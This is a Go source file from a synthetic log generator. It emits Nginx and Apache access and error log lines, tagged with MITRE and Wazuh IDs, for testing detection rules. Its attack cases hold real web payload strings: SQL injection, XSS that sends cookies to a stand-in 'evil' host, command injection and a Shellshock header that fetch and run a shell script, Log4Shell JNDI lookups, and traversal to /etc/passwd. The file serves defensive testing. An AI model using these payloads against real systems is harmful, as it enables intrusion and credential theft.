package catalog

import (
	"fmt"
	"strings"

	"github.com/theshahrukh98khan/LogGen/internal/core"
)

// Nginx and Apache controls.
//
// Both servers write the same combined access log format, so the request cases
// are defined once and registered for each server. Only the syslog tag and the
// error log format differ, which is exactly the difference a parser has to cope
// with in production.

// ModSecurity quotes the operator and the matched variable with a backtick on
// the left and an apostrophe on the right, which is awkward to inline. Holding
// the two fragments as constants keeps the builders readable.
const (
	modsecMatch = "Matched \"Operator `Rx' with parameter `(?i:union.*select)' against variable `ARGS:id'\""
	modsecRule  = "[file \"/etc/modsecurity.d/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\"] " +
		"[id \"942100\"] [msg \"SQL Injection Attack Detected\"] [severity \"CRITICAL\"]"
)

// webServer describes one of the two web servers.
type webServer struct {
	source string
	tag    string
	label  string
}

var webServers = []webServer{
	{source: core.SourceNginx, tag: "nginx", label: "Nginx"},
	{source: core.SourceApache, tag: "httpd", label: "Apache"},
}

// webCase is one request to simulate.
type webCase struct {
	key      string
	name     string
	desc     string
	group    string
	severity string
	mitre    []string
	wazuh    []string

	method   string
	status   int
	external bool // request comes from the internet rather than the estate

	path    func(c *core.Ctx) string
	size    func(c *core.Ctx) int
	agent   func(c *core.Ctx) string
	referer func(c *core.Ctx) string
	user    func(c *core.Ctx) string
}

// webErrCase is one error log entry, rendered per server.
type webErrCase struct {
	key      string
	name     string
	desc     string
	severity string
	mitre    []string
	wazuh    []string

	level   string // nginx level / apache module:level
	nginx   func(c *core.Ctx, client string) string
	apache  func(c *core.Ctx, client string, port int) string
}

func init() {
	for _, srv := range webServers {
		srv := srv
		for _, tc := range webAccessCases() {
			tc := tc
			registerWebAccess(srv, tc)
		}
		for _, ec := range webErrorCases() {
			ec := ec
			registerWebError(srv, ec)
		}
	}
}

// ---------------------------------------------------------------------------
// Access log
// ---------------------------------------------------------------------------

func registerWebAccess(srv webServer, tc webCase) {
	params := []core.Param{
		param("srcip", "Client IP", "auto"),
		param("path", "Request path", "auto"),
		param("ua", "User agent", "auto"),
	}

	Register(core.Definition{
		Control: core.Control{
			ID:     srv.source + "-" + tc.key,
			Source: srv.source,
			Group:  tc.group,
			Name:   tc.name,
			Desc:   tc.desc,
			// Status doubles as the event identifier for web sources: it is the
			// first thing anyone looks at in an access log.
			EventID:  fmt.Sprint(tc.status),
			Channel:  "access",
			Severity: tc.severity,
			Mitre:    tc.mitre,
			Wazuh:    tc.wazuh,
			Params:   params,
		},
		Build: func(c *core.Ctx) core.Payload {
			ip := c.P("srcip", clientIP(c, tc.external))
			path := c.P("path", tc.path(c))
			ua := c.P("ua", tc.agent(c))

			line := fmt.Sprintf(`%s - %s [%s] "%s %s HTTP/1.1" %d %d "%s" "%s"`,
				ip,
				tc.user(c),
				c.Now.Format("02/Jan/2006:15:04:05 -0700"),
				tc.method,
				path,
				tc.status,
				tc.size(c),
				tc.referer(c),
				ua,
			)

			return core.Payload{
				Kind:     srv.source,
				Tag:      srv.tag,
				Host:     c.Env.WebHost,
				Facility: core.FacLocal7,
				Severity: statusSeverity(tc.status),
				Message:  line,
			}
		},
	})
}

// webAccessCases is the shared request table.
func webAccessCases() []webCase {
	anyUA := func(c *core.Ctx) string { return c.UserAgent() }
	noRef := func(c *core.Ctx) string { return "-" }
	noUser := func(c *core.Ctx) string { return "-" }
	small := func(c *core.Ctx) int { return c.Int(180, 900) }
	page := func(c *core.Ctx) int { return c.Int(1200, 48000) }

	return []webCase{
		{
			key: "200-get", name: "Normal page request", group: "Traffic",
			desc:     "A successful GET, the baseline every web detection rule has to tolerate.",
			severity: core.SevLabelInfo, wazuh: []string{"31100"},
			method: "GET", status: 200,
			path:  func(c *core.Ctx) string { return c.Pick("/", "/index.html", "/about", "/api/v1/products", "/static/app.css") },
			size:  page, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "200-login", name: "Successful login POST", group: "Traffic",
			desc:     "An authenticated POST to a login endpoint.",
			severity: core.SevLabelInfo, wazuh: []string{"31100"},
			method: "POST", status: 302,
			path:  func(c *core.Ctx) string { return c.Pick("/login", "/api/auth/login", "/wp-login.php") },
			size:  small, agent: anyUA, referer: noRef,
			user: func(c *core.Ctx) string { return c.User() },
		},
		{
			key: "401-unauthorized", name: "Unauthorized (401)", group: "Traffic",
			desc:     "Credentials were missing or wrong. Burst this to simulate credential stuffing.",
			severity: core.SevLabelMedium, mitre: []string{"T1110"}, wazuh: []string{"31101", "31151"},
			method: "GET", status: 401, external: true,
			path:  func(c *core.Ctx) string { return c.Pick("/admin", "/api/v1/users", "/manager/html") },
			size:  small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "403-forbidden", name: "Forbidden (403)", group: "Traffic",
			desc:     "The server refused the request. Often the visible result of a WAF rule.",
			severity: core.SevLabelMedium, wazuh: []string{"31101"},
			method: "GET", status: 403, external: true,
			path:  func(c *core.Ctx) string { return c.Pick("/.env", "/.git/config", "/config.php", "/backup.sql") },
			size:  small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "404-notfound", name: "Not found (404)", group: "Traffic",
			desc:     "A missing resource. A burst of these from one IP is directory enumeration.",
			severity: core.SevLabelLow, mitre: []string{"T1595"}, wazuh: []string{"31101", "31151"},
			method: "GET", status: 404, external: true,
			path: func(c *core.Ctx) string {
				return c.Pick("/phpmyadmin/", "/wp-admin/", "/admin.php", "/cgi-bin/test.cgi", "/api/v2/debug")
			},
			size: small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "500-error", name: "Server error (500)", group: "Traffic",
			desc:     "The application failed. A spike can mean exploitation of an unhandled input.",
			severity: core.SevLabelMedium, wazuh: []string{"31106"},
			method: "POST", status: 500,
			path:  func(c *core.Ctx) string { return c.Pick("/api/v1/orders", "/checkout", "/api/v1/upload") },
			size:  small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "sqli", name: "SQL injection attempt", group: "Web Attack",
			desc:     "A UNION SELECT or boolean payload in a query parameter.",
			severity: core.SevLabelHigh, mitre: []string{"T1190"}, wazuh: []string{"31103"},
			method: "GET", status: 200, external: true,
			path: func(c *core.Ctx) string {
				return c.Pick(
					"/product.php?id=1%27%20UNION%20SELECT%20NULL,username,password%20FROM%20users--",
					"/search?q=1%27%20OR%20%271%27=%271",
					"/api/v1/items?id=1%20AND%20SLEEP(5)--",
					"/login.php?user=admin%27--&pass=x",
				)
			},
			size: small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "xss", name: "Cross-site scripting attempt", group: "Web Attack",
			desc:     "A script payload reflected through a query parameter.",
			severity: core.SevLabelHigh, mitre: []string{"T1059.007"}, wazuh: []string{"31105"},
			method: "GET", status: 200, external: true,
			path: func(c *core.Ctx) string {
				return c.Pick(
					"/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
					"/comment?text=%3Cimg%20src=x%20onerror=fetch(%27http://evil/%27%2Bdocument.cookie)%3E",
					"/profile?name=%3Csvg/onload=alert(1)%3E",
				)
			},
			size: small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "traversal", name: "Path traversal attempt", group: "Web Attack",
			desc:     "Directory traversal aimed at files outside the web root.",
			severity: core.SevLabelHigh, mitre: []string{"T1083"}, wazuh: []string{"31104"},
			method: "GET", status: 403, external: true,
			path: func(c *core.Ctx) string {
				return c.Pick(
					"/download?file=../../../../etc/passwd",
					"/static/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
					"/view.php?page=....//....//etc/hosts",
				)
			},
			size: small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "cmdinjection", name: "Command injection attempt", group: "Web Attack",
			desc:     "Shell metacharacters passed into a parameter that reaches a system call.",
			severity: core.SevLabelCritical, mitre: []string{"T1190", "T1059"}, wazuh: []string{"31104"},
			method: "GET", status: 200, external: true,
			path: func(c *core.Ctx) string {
				return c.Pick(
					"/ping?host=127.0.0.1%3Bcat%20/etc/passwd",
					"/tools/dns?d=example.com%7Cwhoami",
					"/api/convert?f=%24(curl%20http://evil/x.sh%7Csh)",
				)
			},
			size: small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "log4shell", name: "JNDI lookup attempt (Log4Shell)", group: "Web Attack",
			desc:     "A JNDI expression placed in the path and User-Agent, as Log4Shell scanners do.",
			severity: core.SevLabelCritical, mitre: []string{"T1190"}, wazuh: []string{"31104"},
			method: "GET", status: 404, external: true,
			path: func(c *core.Ctx) string { return "/%24%7Bjndi:ldap://" + c.ExternalIP() + ":1389/a%7D" },
			size: small,
			agent: func(c *core.Ctx) string {
				return "${jndi:ldap://" + c.ExternalIP() + ":1389/Exploit}"
			},
			referer: noRef, user: noUser,
		},
		{
			key: "webshell", name: "Web shell access", group: "Web Attack",
			desc:     "A request to an uploaded shell with a command parameter — post-exploitation, not probing.",
			severity: core.SevLabelCritical, mitre: []string{"T1505.003"}, wazuh: []string{"31108"},
			method: "POST", status: 200, external: true,
			path: func(c *core.Ctx) string {
				return c.Pick(
					"/uploads/shell.php?cmd=id",
					"/images/.well-known/a.jsp",
					"/wp-content/uploads/2024/03/wp-conf.php",
				)
			},
			size: small, agent: anyUA, referer: noRef, user: noUser,
		},
		{
			key: "scanner", name: "Vulnerability scanner", group: "Reconnaissance",
			desc:     "A request whose User-Agent identifies a scanning tool.",
			severity: core.SevLabelMedium, mitre: []string{"T1595.002"}, wazuh: []string{"31101"},
			method: "GET", status: 404, external: true,
			path: func(c *core.Ctx) string { return c.Pick("/admin/config.php", "/cgi-bin/", "/test.php", "/server-status") },
			size: small,
			agent: func(c *core.Ctx) string {
				return c.Pick(
					"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)",
					"sqlmap/1.8.3#stable (https://sqlmap.org)",
					"Mozilla/5.0 zgrab/0.x",
					"masscan/1.3.2",
					"WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)",
				)
			},
			referer: noRef, user: noUser,
		},
		{
			key: "shellshock", name: "Shellshock attempt", group: "Web Attack",
			desc:     "A CGI request carrying a bash function definition in a header value.",
			severity: core.SevLabelHigh, mitre: []string{"T1190"}, wazuh: []string{"31168"},
			method: "GET", status: 500, external: true,
			path:  func(c *core.Ctx) string { return c.Pick("/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/admin.sh") },
			size:  small,
			agent: func(c *core.Ctx) string { return "() { :; }; /bin/bash -c 'curl http://" + c.ExternalIP() + "/x|sh'" },
			referer: noRef, user: noUser,
		},
		{
			key: "brute-login", name: "Login brute force", group: "Web Attack",
			desc:     "A failed login POST. Burst this control to produce a credible brute force run.",
			severity: core.SevLabelHigh, mitre: []string{"T1110"}, wazuh: []string{"31101", "31151"},
			method: "POST", status: 401, external: true,
			path:  func(c *core.Ctx) string { return c.Pick("/wp-login.php", "/login", "/api/auth/login", "/administrator/index.php") },
			size:  small, agent: anyUA,
			referer: func(c *core.Ctx) string { return "http://" + c.Env.WebHost + "/wp-login.php" },
			user:    noUser,
		},
		{
			key: "large-upload", name: "Large file upload", group: "Exfiltration",
			desc:     "An oversized POST. Repeated large uploads can indicate staging or exfiltration.",
			severity: core.SevLabelMedium, mitre: []string{"T1041"}, wazuh: []string{"31100"},
			method: "POST", status: 201,
			path:  func(c *core.Ctx) string { return c.Pick("/api/v1/upload", "/files/import", "/wp-admin/async-upload.php") },
			size:  func(c *core.Ctx) int { return c.Int(20_000_000, 240_000_000) },
			agent: anyUA, referer: noRef,
			user: func(c *core.Ctx) string { return c.User() },
		},
	}
}

// ---------------------------------------------------------------------------
// Error log
// ---------------------------------------------------------------------------

func registerWebError(srv webServer, ec webErrCase) {
	Register(core.Definition{
		Control: core.Control{
			ID:     srv.source + "-error-" + ec.key,
			Source: srv.source,
			Group:  "Error Log",
			Name:   ec.name,
			Desc:   ec.desc,
			// The error log is a different file with a different format, which
			// is worth making obvious in the UI.
			Channel:  "error",
			Severity: ec.severity,
			Mitre:    ec.mitre,
			Wazuh:    ec.wazuh,
			Params: []core.Param{
				param("srcip", "Client IP", "auto"),
			},
		},
		Build: func(c *core.Ctx) core.Payload {
			client := c.P("srcip", c.ExternalIP())

			var line string
			if srv.source == core.SourceNginx {
				line = ec.nginx(c, client)
			} else {
				line = ec.apache(c, client, c.EphemeralPort())
			}

			return core.Payload{
				Kind:     srv.source,
				Tag:      srv.tag,
				Host:     c.Env.WebHost,
				Facility: core.FacLocal7,
				Severity: core.SevErr,
				Message:  line,
			}
		},
	})
}

func webErrorCases() []webErrCase {
	return []webErrCase{
		{
			key: "notfound", name: "File not found", severity: core.SevLabelLow,
			desc:  "The server could not open a requested file. A flood of these accompanies directory enumeration.",
			wazuh: []string{"31301"},
			nginx: func(c *core.Ctx, client string) string {
				path := c.Pick("/usr/share/nginx/html/admin.php", "/usr/share/nginx/html/.env", "/usr/share/nginx/html/backup.zip")
				return fmt.Sprintf(
					`%s [error] %d#%d: *%d open() "%s" failed (2: No such file or directory), `+
						`client: %s, server: %s, request: "GET %s HTTP/1.1", host: "%s"`,
					c.Now.Format("2006/01/02 15:04:05"), c.PID(), c.Int(0, 7), c.Int(1000, 99999),
					path, client, c.Env.WebHost, strings.TrimPrefix(path, "/usr/share/nginx/html"), c.Env.WebHost)
			},
			apache: func(c *core.Ctx, client string, port int) string {
				path := c.Pick("/var/www/html/admin.php", "/var/www/html/.env", "/var/www/html/backup.zip")
				return fmt.Sprintf(
					`[%s] [core:info] [pid %d:tid %d] [client %s:%d] AH00128: File does not exist: %s`,
					c.Now.Format("Mon Jan 02 15:04:05.000000 2006"), c.PID(), c.Int(140000000000, 140999999999),
					client, port, path)
			},
		},
		{
			key: "forbidden", name: "Access denied by rule", severity: core.SevLabelMedium,
			desc:  "A configuration rule refused the request, which is how a blocked probe surfaces in the error log.",
			mitre: []string{"T1190"}, wazuh: []string{"31302"},
			nginx: func(c *core.Ctx, client string) string {
				return fmt.Sprintf(
					`%s [error] %d#%d: *%d access forbidden by rule, client: %s, server: %s, `+
						`request: "GET /.git/config HTTP/1.1", host: "%s"`,
					c.Now.Format("2006/01/02 15:04:05"), c.PID(), c.Int(0, 7), c.Int(1000, 99999),
					client, c.Env.WebHost, c.Env.WebHost)
			},
			apache: func(c *core.Ctx, client string, port int) string {
				return fmt.Sprintf(
					`[%s] [authz_core:error] [pid %d:tid %d] [client %s:%d] AH01630: client denied by server configuration: /var/www/html/.git/config`,
					c.Now.Format("Mon Jan 02 15:04:05.000000 2006"), c.PID(), c.Int(140000000000, 140999999999),
					client, port)
			},
		},
		{
			key: "upstream", name: "Backend unavailable", severity: core.SevLabelMedium,
			desc:  "The application behind the web server stopped responding. Often the first sign of a crash or resource exhaustion.",
			wazuh: []string{"31303"},
			nginx: func(c *core.Ctx, client string) string {
				return fmt.Sprintf(
					`%s [error] %d#%d: *%d connect() failed (111: Connection refused) while connecting to upstream, `+
						`client: %s, server: %s, request: "GET /api/v1/health HTTP/1.1", `+
						`upstream: "http://127.0.0.1:8080/api/v1/health", host: "%s"`,
					c.Now.Format("2006/01/02 15:04:05"), c.PID(), c.Int(0, 7), c.Int(1000, 99999),
					client, c.Env.WebHost, c.Env.WebHost)
			},
			apache: func(c *core.Ctx, client string, port int) string {
				return fmt.Sprintf(
					`[%s] [proxy:error] [pid %d:tid %d] [client %s:%d] AH00957: HTTP: attempt to connect to 127.0.0.1:8080 (127.0.0.1) failed`,
					c.Now.Format("Mon Jan 02 15:04:05.000000 2006"), c.PID(), c.Int(140000000000, 140999999999),
					client, port)
			},
		},
		{
			key: "modsec", name: "WAF rule triggered", severity: core.SevLabelHigh,
			desc:  "ModSecurity blocked a request and named the rule and matched data.",
			mitre: []string{"T1190"}, wazuh: []string{"31104"},
			nginx: func(c *core.Ctx, client string) string {
				return fmt.Sprintf(
					"%s [error] %d#%d: *%d [client %s] ModSecurity: Access denied with code 403 (phase 2). "+
						modsecMatch+" "+modsecRule+", client: %s, server: %s, "+
						"request: \"GET /product.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\", host: \"%s\"",
					c.Now.Format("2006/01/02 15:04:05"), c.PID(), c.Int(0, 7), c.Int(1000, 99999),
					client, client, c.Env.WebHost, c.Env.WebHost)
			},
			apache: func(c *core.Ctx, client string, port int) string {
				return fmt.Sprintf(
					"[%s] [security2:error] [pid %d:tid %d] [client %s:%d] "+
						"ModSecurity: Access denied with code 403 (phase 2). "+
						modsecMatch+" "+modsecRule+" "+
						"[hostname \"%s\"] [uri \"/product.php\"] [unique_id \"%s\"]",
					c.Now.Format("Mon Jan 02 15:04:05.000000 2006"), c.PID(), c.Int(140000000000, 140999999999),
					client, port, c.Env.WebHost, c.HexLower(16))
			},
		},
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// clientIP picks an address from the internet or from inside the estate.
func clientIP(c *core.Ctx, external bool) string {
	if external {
		return c.ExternalIP()
	}
	return c.InternalIP()
}

// statusSeverity maps an HTTP status onto a syslog severity, the way a web
// server grades its own output.
func statusSeverity(status int) int {
	switch {
	case status >= 500:
		return core.SevErr
	case status >= 400:
		return core.SevWarning
	default:
		return core.SevInfo
	}
}
